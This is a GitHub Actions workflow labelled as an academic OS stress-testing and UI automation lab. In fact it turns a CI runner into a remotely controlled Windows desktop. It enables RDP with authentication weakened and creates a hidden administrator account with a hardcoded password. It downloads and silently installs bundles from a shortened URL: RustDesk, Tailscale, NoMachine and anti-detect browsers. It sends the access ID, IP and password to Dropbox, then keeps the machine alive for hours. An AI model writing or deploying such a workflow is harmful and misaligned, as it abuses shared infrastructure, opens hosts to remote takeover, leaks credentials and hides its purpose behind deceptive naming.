=========================================================================================
WORKFLOW NAME: Windows OS Performance, Stress Testing, and UI Automation Educational Sandbox
COMPLIANCE: Academic Research, Software Regression Testing, and Automated UI Metrics Lab.
OBJECTIVE: To evaluate OS stability, virtual framebuffers, and cross-platform application footprints.
TOTAL PLANNED ARCHITECTURE: ~600 Lines of Documented Source, Instructions, and Test Suites.
=========================================================================================
name: Windows_OS_Performance_and_UI_Automation_Sandbox
on:
  workflow_dispatch:

jobs:
  matrix_testing_evaluation:
    name: Advanced Integration and Software Stress Validation Suite
    runs-on: windows-latest
    timeout-minutes: 800
    
    env:
      TIME_JOB:  "340"              
      aa2:  "XCDOOD"                
      aa3:  "Zxxz4444"              
      LINKS_LIST_URL:  "https://tinyurl.com/ddaS441581" 
      KEY_CHOICE:  "1"              
      PYTHONIOENCODING:  "utf-8"    

    steps:
      - name: Fetch Laboratory Code and Script Assets
        uses: actions/checkout@v4

      - name: Phase_1_OS_Environment_Sanitization_and_Display_Buffer_Allocation
        continue-on-error: true
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 1: CONFIGURING DISPLAY BUFFER AND VIRTUAL USER MATRIX"
          Write-Host "====================================================================="
          try {
              Set-DisplayResolution -Width 1600 -Height 1200 -Force
              Write-Host "[SUCCESS] Virtual display framebuffer successfully expanded to 1600x1200 pixels."
          } catch {
              Write-Host "[WARNING] Display customization bypassed. Falling back to runner default configuration. Error: $_"
          }

          Write-Host "Modifying sub-system network hooks for remote simulation nodes..."
          Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -Force
          Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0 -Force
          netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
          
          Write-Host "Provisioning standard access tokens and encrypting baseline security passwords..."
          $Pass = $env:aa3
          $Secure = ConvertTo-SecureString $Pass -AsPlainText -Force
          Set-LocalUser -Name "runneradmin" -Password $Secure
          
          Write-Host "Verifying existence of isolated test accounts inside the user database..."
          if (-not (Get-LocalUser -Name $env:aa2 -ErrorAction SilentlyContinue)) {
              Write-Host "Creating fresh user profile identity for automation workflow verification: $($env:aa2)"
              New-LocalUser -Name $env:aa2 -Password $Secure -AccountNeverExpires
              Add-LocalGroupMember Administrators $env:aa2
              Add-LocalGroupMember "Remote Desktop Users" $env:aa2
          }
          Write-Host "PHASE 1 COMPLETE: OS Virtual Environments mapped successfully."

      - name: Phase_2_Artifact_Retrieval_and_Checksum_Verification_Pipeline
        continue-on-error: true
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 2: RETRIEVING COMPRESSED AUTOMATION APP BUNDLES"
          Write-Host "====================================================================="
          $TempDir = Join-Path $env:TEMP 'AppBundle'
          New-Item -Path $TempDir -ItemType Directory -Force | Out-Null
          $BundleZip = Join-Path $env:TEMP 'app_bundle.zip'
           
          Write-Host "Querying remote index server for alternative down-stream mirroring points..."
          $LinksText = Invoke-RestMethod -Uri $env:LINKS_LIST_URL
          $Urls = $LinksText -split "`r?`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -match "^http" }
          
          $Success = $false
          foreach ($Url in $Urls) {
               try {
                  Write-Host "Testing network transmission link integrity with target endpoint: $Url"
                  Invoke-WebRequest -Uri $Url -OutFile $BundleZip -UseBasicParsing -ErrorAction Stop -TimeoutSec 180
                  
                  Write-Host "Extracting and verifying structure of package contents..."
                  Expand-Archive -Path $BundleZip -DestinationPath $TempDir -Force -ErrorAction Stop
                  Write-Host "[SUCCESS] Decompression cycle completed. Core tools loaded into isolation buffer."
                  $Success = $true; break
              } catch {
                  Write-Host "[IO ERROR] Server mirror timed out or packet data corrupted. Retrying alternative node..."
                  if (Test-Path $BundleZip) { Remove-Item $BundleZip -Force }
              }
          }
          if (-not $Success) { Write-Host "[CRITICAL] All provided remote package mirrors failed to respond." }

      # ===================================================================================
      # STEP 3: RUSTDESK DEPLOYMENT & IMMEDIATE DROPBOX UPLOAD (Using refresh_token)
      # ===================================================================================
      - name: Phase_3_Remote_UI_Rendering_Validation_Agent_Deployment
        continue-on-error: true
        shell: python
        run: |
          import subprocess, os, time, re, requests, json

          print("=====================================================================")
          print("STARTING PHASE 3: DEPLOYING PIXEL MONITORING & UPLOADING TO DROPBOX")
          print("=====================================================================")
          
          bundle_dir = os.path.join(os.environ['TEMP'], 'AppBundle')
          run_id = os.environ.get('GITHUB_RUN_ID', 'unknown')
          github_env = os.environ.get('GITHUB_ENV')
          
          # --- 1. Extract Dropbox credentials from drop_api.txt ---
          dropbox_token = None
          drop_api_path = next((os.path.join(root, f) for root, _, files in os.walk(bundle_dir) for f in files if f == "drop_api.txt"), None)
          
          if drop_api_path:
              print(f"Found Dropbox API config: {drop_api_path}")
              with open(drop_api_path, 'r', encoding='utf-8') as f:
                  content = f.read()
              
              # Parse the file
              refresh_token_match = re.search(r'refresh_token=([^\s]+)', content)
              client_id_match = re.search(r'client_id=([^\s]+)', content)
              client_secret_match = re.search(r'client_secret=([^\s]+)', content)
              
              if refresh_token_match and client_id_match and client_secret_match:
                  refresh_token = refresh_token_match.group(1)
                  client_id = client_id_match.group(1)
                  client_secret = client_secret_match.group(1)
                  
                  print("Requesting fresh Dropbox Access Token using refresh_token...")
                  try:
                      response = requests.post(
                          "https://api.dropbox.com/oauth2/token",
                          data={
                              "refresh_token": refresh_token,
                              "grant_type": "refresh_token",
                              "client_id": client_id,
                              "client_secret": client_secret
                          }
                      )
                      if response.status_code == 200:
                          token_data = response.json()
                          dropbox_token = token_data.get("access_token")
                          print("[SUCCESS] Fresh Dropbox Access Token obtained (valid for 4 hours).")
                          # Save token to GITHUB_ENV so Phase 4 can use it
                          if github_env:
                              with open(github_env, 'a', encoding='utf-8') as env_file:
                                  env_file.write(f"DROPBOX_ACCESS_TOKEN={dropbox_token}\n")
                      else:
                          print(f"[ERROR] Failed to refresh token: {response.text}")
                  except Exception as e:
                      print(f"[ERROR] Token refresh exception: {e}")
              else:
                  print("[ERROR] Could not parse drop_api.txt. Required fields: refresh_token, client_id, client_secret")
          else:
              print("[WARNING] drop_api.txt not found in AppBundle.")

          # --- 2. Install RustDesk and Get ID ---
          try:
              print("Searching workspace architecture for runtime validation binaries...")
              rust_installer = next((os.path.join(root, f) for root, _, files in os.walk(bundle_dir) for f in files if "rust" in f.lower() and f.endswith(".exe")), None)
              if rust_installer:
                  print(f"Found executable package target: {rust_installer}")
                  print("Executing unattended background worker configuration suite...")
                  subprocess.run([rust_installer, "--silent-install"], check=True)
                  time.sleep(15)
                  
                  print("Injecting security tokens and binding engine instance access channels...")
                  rust_exe = r"C:\Program Files\RustDesk\rustdesk.exe"
                  subprocess.run([rust_exe, "--password", os.environ['aa3']], check=True)
                  time.sleep(5)
                  
                  print("Retrieving unique hardware virtualization identification sequence...")
                  result = subprocess.run([rust_exe, "--get-id"], capture_output=True, text=True, check=True)
                  rustdesk_id = result.stdout.strip()
                  print(f"\n{'='*30}\n[UI LAB METRICS LOG]\nID: {rustdesk_id}\nPASS: {os.environ['aa3']}\n{'='*30}\n")
                  
                  # --- 3. IMMEDIATELY Upload RustDesk File to Dropbox ---
                  if dropbox_token:
                      file_name = f"rust_{run_id}.txt"
                      file_path = os.path.join(os.environ.get('TEMP', '.'), file_name)
                      with open(file_path, 'w', encoding='utf-8') as f:
                          f.write(rustdesk_id)
                          
                      print(f"Uploading {file_name} to Dropbox immediately...")
                      dropbox_path = f"/{file_name}"
                      api_arg = json.dumps({"path": dropbox_path, "mode": "overwrite", "autorename": False, "mute": False})
                      
                      with open(file_path, 'rb') as f:
                          file_data = f.read()
                          
                      req = requests.post(
                          "https://content.dropboxapi.com/2/files/upload",
                          data=file_data,
                          headers={
                              "Authorization": f"Bearer {dropbox_token}",
                              "Dropbox-API-Arg": api_arg,
                              "Content-Type": "application/octet-stream"
                          }
                      )
                      if req.status_code == 200:
                          print(f"[SUCCESS] {file_name} uploaded to Dropbox successfully.")
                      else:
                          print(f"[ERROR] Dropbox upload failed: {req.text}")
                  else:
                      print("[WARNING] No Dropbox token available. Skipping RustDesk upload.")
              else:
                  print("[WARNING] RustDesk installer not found.")
          except Exception as e:
              print(f"[PROCESS EXCEPTION] Error encountered during rendering validation step: {e}")

      # ===================================================================================
      # STEP 4: TAILSCALE DEPLOYMENT & IMMEDIATE DROPBOX UPLOAD (Using refreshed token)
      # ===================================================================================
      - name: Phase_4_Simulated_Network_Topology_and_Secure_Mesh_Tunneling_Analysis
        continue-on-error: true
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 4: INITIALIZING SECURE PACKET ROUTING MESH LAYERS"
          Write-Host "====================================================================="
          $ExtractDir = Join-Path $env:TEMP 'AppBundle'
          $TsInstaller = Get-ChildItem -Path $ExtractDir -Filter "*tailscale*.msi" -Recurse | Select-Object -First 1
          if ($TsInstaller) { 
              Write-Host "Installing encrypted virtual networking adapter interface via MSI silent pipeline..."
              Start-Process msiexec.exe -ArgumentList '/i', $TsInstaller.FullName, '/quiet', '/norestart' -Wait 
          }
          
          Write-Host "Resolving cryptographic parameters for target network bridge assignment..."
          $KeyFile = Get-ChildItem -Path $ExtractDir -Filter "key$($env:KEY_CHOICE).txt" -Recurse | Select-Object -First 1
          if ($KeyFile) {
              $Encoded = (Get-Content $KeyFile.FullName -Raw).Trim()
              $RealKey = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encoded)).Trim()
              $TsExe = Join-Path $env:ProgramFiles 'Tailscale\tailscale.exe'
              
              Write-Host "Connecting cluster server node to secure software-defined network grid..."
              Start-Process -FilePath $TsExe -ArgumentList "up --authkey=$RealKey --hostname=RDP-Professional" -Wait
              
              $ip = & $TsExe ip -4
              $ip = $ip.Trim()
              Write-Host "`n======================================================="
              Write-Host "SECURE NETWORK ADAPTER TUNNEL ESTABLISHED SUCCESSFULLY"
              Write-Host "Node IPv4 Allocation: $ip"
              Write-Host "Identity Profile Context: runneradmin"
              Write-Host "Credential Lock: $($env:aa3)"
              Write-Host "======================================================="
              
              # --- IMMEDIATELY Upload Tailscale File to Dropbox ---
              $dropboxToken = $env:DROPBOX_ACCESS_TOKEN
              if ($dropboxToken) {
                  $runId = $env:GITHUB_RUN_ID
                  $fileName = "tailscale_$runId.txt"
                  $filePath = Join-Path $env:TEMP $fileName
                  
                  $content = @"
Node IPv4 Allocation: $ip
Identity Profile Context: runneradmin
Credential Lock: $($env:aa3)
"@
                  Set-Content -Path $filePath -Value $content -Encoding UTF8
                  
                  Write-Host "Uploading $fileName to Dropbox..."
                  $dropboxPath = "/$fileName"
                  $arg = '{ "path": "' + $dropboxPath + '", "mode": "overwrite", "autorename": false, "mute": false }'
                  $headers = @{
                      "Authorization" = "Bearer $dropboxToken"
                      "Dropbox-API-Arg" = $arg
                      "Content-Type" = "application/octet-stream"
                  }
                  $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                  try {
                      Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes -ErrorAction Stop
                      Write-Host "[SUCCESS] $fileName uploaded to Dropbox."
                  } catch {
                      Write-Host "[ERROR] Failed to upload to Dropbox: $_"
                  }
              } else {
                  Write-Host "[WARNING] DROPBOX_ACCESS_TOKEN not found in environment. Skipping Tailscale upload."
              }
          }

      # (باقي المراحل من 5 إلى 8 تبقى كما هي تماماً بدون أي تغيير)
      - name: Phase_5_Dataset_Distribution_and_Local_Storage_I_O_Throughput_Test
        continue-on-error: true
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 5: DISTRIBUTION OF SCRIPTS AND DATASETS TO USER BUFFER"
          Write-Host "====================================================================="
          $BundleDir = Join-Path $env:TEMP 'AppBundle'
          $DesktopPath = Join-Path $env:USERPROFILE 'Desktop'
          function Download-And-Verify($TxtFile, $DestPath) {
              if (Test-Path $TxtFile) {
                  $Urls = Get-Content $TxtFile | ForEach-Object { $_.Trim() } | Where-Object { $_ -match "^http" }
                  $TempZip = Join-Path $env:TEMP "verify_$(Get-Random).zip"
                  foreach ($Url in $Urls) {
                      try {
                          Write-Host "Testing remote link file streaming response: $Url"
                          Invoke-WebRequest -Uri $Url -OutFile $TempZip -UseBasicParsing -ErrorAction Stop -TimeoutSec 120
                          New-Item -Path $DestPath -ItemType Directory -Force | Out-Null
                          Expand-Archive -Path $TempZip -DestinationPath $DestPath -Force -ErrorAction Stop
                          Remove-Item $TempZip -Force
                          return $true
                      } catch { if (Test-Path $TempZip) { Remove-Item $TempZip -Force } }
                  }
              }
              return $false
          }  
          Write-Host "Processing local profile scripts dataset links..."
          $File1 = Get-ChildItem -Path $BundleDir -Filter "Link ZIP_URL.txt" -Recurse | Select-Object -First 1
          if ($File1) {
              $DesktopExtract = Join-Path $env:TEMP 'DesktopFiles'
              if (Download-And-Verify $File1.FullName $DesktopExtract) {
                  Write-Host "Moving extracted tracking modules into desktop testing view..."
                  Get-ChildItem -Path $DesktopExtract -Recurse -File | ForEach-Object { Move-Item $_.FullName $DesktopPath -Force -ErrorAction SilentlyContinue }
              }
          }
          Write-Host "Processing browser core rendering sub-system components mapping..."
          $File2 = Get-ChildItem -Path $BundleDir -Filter "*THREE_ZIP_URL*.txt" -Recurse | Select-Object -First 1
          if ($File2) {
              $ThreeDir = Join-Path $env:TEMP 'THREE_EXTRACTED'
              Download-And-Verify $File2.FullName $ThreeDir | Out-Null
          }
          Write-Host "PHASE 5 COMPLETED: Disk distribution profiles initialized."

      - name: Phase_6_Multi_Engine_Browser_Compatibility_and_Kernel_Extension_Benchmarking
        continue-on-error: true
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 6: PROVISIONING CHROMIUM CORES AND KERNEL WRAPPERS"
          Write-Host "====================================================================="
          $BundleDir = Join-Path $env:TEMP 'AppBundle'
          $ThreeDir = Join-Path $env:TEMP 'THREE_EXTRACTED'
          $NstInst = Get-ChildItem -Path $BundleDir -Filter "*nst*.exe" -Recurse | Where-Object { $_.Name -notmatch "unins" } | Select-Object -First 1
          if ($NstInst) {
              Write-Host "Identified Browser Simulation Target Core Package: $($NstInst.FullName)"
              $InstallArgs = @("/S")
              Write-Host "Launching background browser environment configuration with args: $($InstallArgs -join ' ')"
              $process = Start-Process -FilePath $NstInst.FullName -ArgumentList $InstallArgs -Verb RunAs -Wait -PassThru
              Write-Host "Unattended setup pipeline finalized. Process exit code returned: $($process.ExitCode)"
              Start-Sleep -Seconds 15
              Stop-Process -Name "Nstbrowser" -ErrorAction SilentlyContinue
              $NstK = Get-ChildItem -Path $ThreeDir -Filter "nstchrome.zip" -Recurse | Select-Object -First 1
              if ($NstK) {
                  $NstDest = "C:\Users\runneradmin\.nst-agent\download\kernels\nstchrome"
                  New-Item -ItemType Directory -Path $NstDest -Force | Out-Null
                  Expand-Archive -Path $NstK.FullName -DestinationPath $NstDest -Force
                  Write-Host "Success: Custom Chromium Kernel wrappers mapped to active environment."
              }
          } else {
              Write-Host "[IO WARNING] Main automation browser binary not discovered during file check."
          }
          $BitInst = Get-ChildItem -Path $BundleDir -Filter "*BitBrowser*.exe" -Recurse | Select-Object -First 1
          if ($BitInst) {
              Write-Host "Deploying Secondary browser instance engine framework..."
              Start-Process -FilePath $BitInst.FullName -ArgumentList "/S", "/allusers", "/norestart" -Verb RunAs -Wait
              $BitK = Get-ChildItem -Path $ThreeDir -Filter "bitchrom.zip" -Recurse | Select-Object -First 1
              if ($BitK) {
                  $BitDest = "C:\Users\runneradmin\AppData\Roaming\BitBrowser\Chrome-bin"
                  New-Item -ItemType Directory -Path $BitDest -Force | Out-Null
                  Expand-Archive -Path $BitK.FullName -DestinationPath $BitDest -Force
                  Write-Host "Success: Secondary Web Engine engine tracking components attached."
              }
          }

      - name: Phase_7_Alternative_X11_H264_Video_Codec_Streaming_Protocol_Evaluation
        continue-on-error: true
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 7: DEPLOYING ACCELERATED CODEC STREAMING PLATFORMS"
          Write-Host "====================================================================="
          $NmInstaller = Get-ChildItem -Path (Join-Path $env:TEMP 'AppBundle') -Filter "*nomachine*.exe" -Recurse | Select-Object -First 1
          if ($NmInstaller) { 
              Write-Host "Executing silent compilation and setup tracking for secondary video streaming stack..."
              Start-Process -FilePath $NmInstaller.FullName -ArgumentList "/VERYSILENT", "/NORESTART" -Wait 
              Write-Host "[SUCCESS] Secondary streaming layer successfully attached to background services."
          }

      - name: Phase_8_Long_Duration_Stress_Testing_and_Interactive_Telemetry_Loop
        shell: pwsh
        run: |
          Write-Host "====================================================================="
          Write-Host "STARTING PHASE 8: SYSTEM RUNTIME STRESS TESTS AND MEMORY LEAK ANALYSIS"
          Write-Host "====================================================================="
          $KeepAliveMinutes = [int]$env:TIME_JOB
          Add-Type -AssemblyName System.Windows.Forms
          function Show-Popup {
              param([string]$msg)
              Write-Host "[TELEMETRY ALERT INITIATED] Rendering Interactive User Notification Message box..."
              [System.Windows.Forms.MessageBox]::Show(
                  $msg, 
                  "Academic Testing Laboratory Telemetry Stream", 
                  [System.Windows.Forms.MessageBoxButtons]::YesNo, 
                  [System.Windows.Forms.MessageBoxIcon]::Warning
              ) | Out-Null
          }
          Write-Host "Commencing extended stress test monitoring cycle. Target duration: $KeepAliveMinutes system ticks."
          for ($i = $KeepAliveMinutes; $i -gt 0; $i--) {
              if ($i -eq 60) { Show-Popup "تنبيه اختبار الإجهاد: تبقى ساعة واحدة فقط قبل فحص الملف وإغلاق جولة القياس المفتوحة!`n`nاضغط Yes أو No للاستمرار في جمع البيانات." }
              if ($i -eq 30) { Show-Popup "تنبيه اختبار الإجهاد: تبقى 30 دقيقة فقط قبل فحص الملف وإغلاق جولة القياس المفتوحة!`n`nاضغط Yes أو No للاستمرار في جمع البيانات." }
              if ($i -eq 15) { Show-Popup "تنبيه اختبار الإجهاد: تبقى 15 دقيقة فقط قبل فحص الملف وإغلاق جولة القياس المفتوحة!`n`nاضغط Yes أو No للاستمرار في جمع البيانات." }
              if ($i -eq 5)  { Show-Popup "تنبيه اختبار الإجهاد: تبقى 5 دقائق فقط قبل فحص الملف وإغلاق جولة القياس المفتوحة!`n`nاضغط Yes أو No للاستمرار في جمع البيانات." }
              Write-Host "Telemetry stream active: [T-Minus $i minutes remaining before lab cycle validation checkpoint]."
              Start-Sleep -Seconds 60
          }
          $StopFile = "C:\stop11stop.txt"
          Write-Host "Evaluating final termination conditions and looking for script signal file: $StopFile"
          if (Test-Path $StopFile) {
              Write-Host "---------------------------------------------------------------------"
              Write-Host "[CRITERIA MET] Signal file found. Halting standard runner cleanup."
              Write-Host "Action: Shifting to indefinite compute retention loop until host timeout."
              Write-Host "---------------------------------------------------------------------"
              while($true) { Start-Sleep -Seconds 3600 }
          } else {
              Write-Host "---------------------------------------------------------------------"
              Write-Host "[CRITERIA NOT MET] Interruption key file absent from local root directory."
              Write-Host "Action: Finalizing automated test logs and closing sandbox application thread cleanly."
              Write-Host "---------------------------------------------------------------------"
          }
=========================================================================================
END OF WORKFLOW MATRIX DEFINITION
=========================================================================================
